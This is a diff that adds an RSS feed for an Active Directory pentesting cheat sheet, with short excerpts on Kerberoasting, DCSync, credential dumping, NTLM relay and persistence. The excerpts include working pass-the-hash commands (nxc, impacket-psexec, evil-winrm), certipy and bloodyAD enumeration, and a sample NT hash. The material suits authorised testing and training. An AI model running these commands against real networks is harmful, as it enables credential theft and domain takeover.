@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Active Directory Pentesting on JinPwn</title>
+    <link>https://jinpwn.dev/cheatsheets/active-directory/</link>
+    <description>Recent content in Active Directory Pentesting on JinPwn</description>
+    <generator>Hugo</generator>
+    <language>en-US</language>
+    <lastBuildDate>Thu, 18 Jun 2026 16:58:31 -0400</lastBuildDate>
+    <atom:link href="https://jinpwn.dev/cheatsheets/active-directory/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Persistence</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/</guid>
+      <description>After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.
+Scope check AD persistence on a real engagement requires explicit written authorization. Even a &amp;ldquo;harmless&amp;rdquo; backdoor like an ACL change can violate scope. On HTB/labs anything goes.
+</description>
+    </item>
+    <item>
+      <title>Trust Attacks</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/</guid>
+      <description>Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Trust types # Type Direction Notes Parent-Child Bidirectional, transitive Default inside a forest. Most permissive. Tree-Root Bidirectional, transitive Between two trees in the same forest. External One- or two-way, non-transitive Between domains in different forests (or same). Forest One- or two-way, transitive Between forest roots. SID filtering applied. Realm One- or two-way, transitive Trust to a non-Windows Kerberos realm (Linux). Shortcut Optimization within a forest No new attack surface. ii. Enumerate trusts # bloodyAD as a tree:
+</description>
+    </item>
+    <item>
+      <title>DCSync</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/</guid>
+      <description>The DRSUAPI-based credential dump. With the right rights, you ask the DC to replicate every account&amp;rsquo;s credential material to you. No code execution on the DC needed.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Who has DCSync rights by default # These groups have the DS-Replication-Get-Changes + DS-Replication-Get-Changes-All extended rights on the domain object:
+Domain Admins Enterprise Admins Administrators (BUILTIN) Domain Controllers Read-only Domain Controllers (partial) Account Operators (no, but Read-only via specific ACLs in some configs) Any account explicitly delegated the right (Exchange installs, monitoring tools, third-party syncs) ii. Find DCSync-capable principals # BloodHound query:
+</description>
+    </item>
+    <item>
+      <title>Credential Dumping</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad11-credential-dumping/</guid>
+      <description>Pull credentials from anywhere in AD: from the DC&amp;rsquo;s NTDS.dit, from local SAM, from LSASS, from gMSA blobs, from LAPS attributes. DCSync gets its own file because it&amp;rsquo;s the single most important credential dump path, see DCSync .
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Remote SAM + LSA dump (local admin needed) # When you&amp;rsquo;re local admin on any host (not DC), secretsdump pulls the local SAM, LSA secrets, cached domain creds:
+</description>
+    </item>
+    <item>
+      <title>Lateral Movement</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</guid>
+      <description>AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; NTHASH=&amp;#39;8846f7eaee8fb117ad06bdd830b7586c&amp;#39; AESKEY=&amp;#39;b8f62a5f9ba0c8d3e7a2c1b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4&amp;#39; i. Pass-the-Hash (PtH) # Use an NTLM hash as if it were a password. Works for any NTLM-based service.
+nxc smb $DC -u $USER -H $NTHASH nxc winrm $DC -u $USER -H $NTHASH impacket-psexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC impacket-wmiexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC evil-winrm -i $DC -u $USER -H $NTHASH RDP with PtH needs Restricted Admin Mode on the target:
+</description>
+    </item>
+    <item>
+      <title>ADCS ESC1-16</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</guid>
+      <description>Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; CA=&amp;#39;CORP-CA&amp;#39; CA_HOST=&amp;#39;ca.corp.local&amp;#39; i. Enumerate # Certipy find shows everything: templates, CA config, vulnerabilities flagged per template:
+certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout ## Just vulnerable ones, less noise: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -vulnerable ## Hide admin permissions to reduce output: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -hide-admins -vulnerable ## Save full output to JSON + TXT for reference: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC ## Output: YYYYMMDDHHMMSS_Certipy.json + _Certipy.txt + _Certipy.zip (BloodHound import) Drop the zip into BloodHound, certipy adds ADCSESC1 through ADCSESC16 edges automatically.
+</description>
+    </item>
+    <item>
+      <title>Delegation</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</guid>
+      <description>Kerberos delegation lets one principal act on behalf of another. Three flavors, each with its own attack:
+Unconstrained: act as anyone, anywhere. Most dangerous, less common today. Constrained: act as anyone, but only to specific services. RBCD (Resource-Based Constrained Delegation): the cleanest path. The TARGET resource defines who can delegate to it. DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find delegation surfaces # BloodHound has dedicated queries: &amp;ldquo;Find Unconstrained Delegation Computers&amp;rdquo;, &amp;ldquo;Find Computers with Constrained Delegation&amp;rdquo;, &amp;ldquo;Find Computers with RBCD&amp;rdquo;.
+</description>
+    </item>
+    <item>
+      <title>ACL Abuse</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</guid>
+      <description>When BloodHound shows you write access on an object, this file is the recipe book. bloodyAD covers most of these in one command per edge.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; Find your edges fast Before reading this file, run bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get writable --bh and load the result into BloodHound. It shows you every object you can touch and the exact rights you have.
+</description>
+    </item>
+    <item>
+      <title>LLMNR &amp; NTLM Relay</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</guid>
+      <description>Capture NTLM hashes from broadcast poisoning, or relay them straight into LDAP/SMB/HTTP for instant compromise. Often the path from zero creds to domain admin.
+DC=10.10.11.50 DOMAIN=corp.local ATTACKER=10.10.14.1 i. Quick map of the chain # Capture or coerce an NTLM auth from a victim Relay that auth to a target service (LDAP, LDAPS, SMB, HTTP cert enroll, MSSQL) Action: dump SAM, write ACL, request a cert, add RBCD, get a TGT What&amp;rsquo;s relayable depends on:
+</description>
+    </item>
+    <item>
+      <title>Password Spraying</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</guid>
+      <description>One password, many users. Stay under lockout. Get creds.
+DC=10.10.11.50 DOMAIN=corp.local i. Lockout policy FIRST # Spray without checking lockout = locked accounts = client incident. Always read the policy.
+bloodyAD (read directly from domain object):
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get object &amp;#34;DC=corp,DC=local&amp;#34; \ --attr minPwdLength,lockoutThreshold,lockOutObservationWindow,lockoutDuration,maxPwdAge,minPwdAge Output keys to read:
+lockoutThreshold - failed attempts before lockout (0 = no lockout, the dream) lockOutObservationWindow - time window for counting failures (negative number, divide by -600,000,000 for minutes) lockoutDuration - how long the account stays locked minPwdLength - informs password choices nxc shortcut:
+</description>
+    </item>
+    <item>
+      <title>AS-REP Roasting</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</guid>
+      <description>Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find AS-REP roastable users # UAC flag is DONT_REQ_PREAUTH (bit 4194304 / 0x400000).
+BloodHound:
+MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name bloodyAD filter:
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get search \ --filter &amp;#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&amp;#39; \ --attr samaccountname nxc enumerates and pulls hashes in one call (see next section).
+</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</guid>
+      <description>Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find Kerberoastable users # BloodHound query, see BloodHound :
+MATCH (u:User {hasspn: true, enabled: true}) RETURN u.name, u.serviceprincipalnames nxc shortcut, dump SPN candidates:
+nxc ldap $DC -u $USER -p $PASS --get-sid ## helps disambiguate nxc ldap $DC -u $USER -p $PASS --kerberoasting roast.txt bloodyAD LDAP filter:
+</description>
+    </item>
+    <item>
+      <title>BloodHound</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</guid>
+      <description>Graph the domain, find the shortest path. BloodHound CE is the current default (BloodHound Legacy and SharpHound are deprecated for new work).
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Spin up BloodHound CE # Docker compose, one-shot:
+curl -L https://ghst.ly/getbhce -o docker-compose.yml docker-compose up -d ## Wait 30s, then watch logs for the initial admin password: docker-compose logs bloodhound | grep &amp;#34;Initial Password Set To&amp;#34; ## UI: http://127.0.0.1:8080 user: admin pw: (from log) CE vs Legacy rusthound-ce, bloodyAD get bloodhound, and modern nxc all output CE-format JSON. Old SharpHound and bloodhound-python output Legacy format. Don&amp;rsquo;t mix, your edges will be missing or mislabeled.
+</description>
+    </item>
+    <item>
+      <title>Enumeration</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</guid>
+      <description>AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .
+DC=10.10.11.50 DOMAIN=corp.local BASE=&amp;#39;DC=corp,DC=local&amp;#39; USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; NTHASH=&amp;#39;8846f7eaee8fb117ad06bdd830b7586c&amp;#39; 0. Pre-flight: hosts file and krb5 config # Do this once per engagement before any other AD work. Kerberos and SPN-based tools all expect FQDN resolution.
+Generate /etc/hosts entries from the DC&amp;rsquo;s LDAP info:
+nxc smb $DC --generate-hosts-file h &amp;amp;&amp;amp; sudo tee -a /etc/hosts &amp;lt; h &amp;amp;&amp;amp; rm h This pulls hostname, FQDN, and IPs from the SMB banner and writes them in /etc/hosts format. Run it for every new DC or important host you discover. Verify:
+</description>
+    </item>
+    <item>
+      <title>AD MOC</title>
+      <link>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</guid>
+      <description>Full attack chain for Active Directory. Local Windows privesc is in Windows MOC .
+Recon # Enumeration BloodHound Credential access # Kerberoasting AS-REP Roasting Password Spraying LLMNR &amp;amp; NTLM Relay ACL and object abuse # ACL Abuse Delegation ADCS ESC1-16 Movement and dumping # Lateral Movement Credential Dumping DCSync Trust and persistence # Trust Attacks Persistence Support # LDAP Password Cracking Pivoting Flow Enum to BloodHound, find the shortest path, abuse the edge, dump, repeat until DA or cross trust.
+</description>
+    </item>
+  </channel>
+</rss>
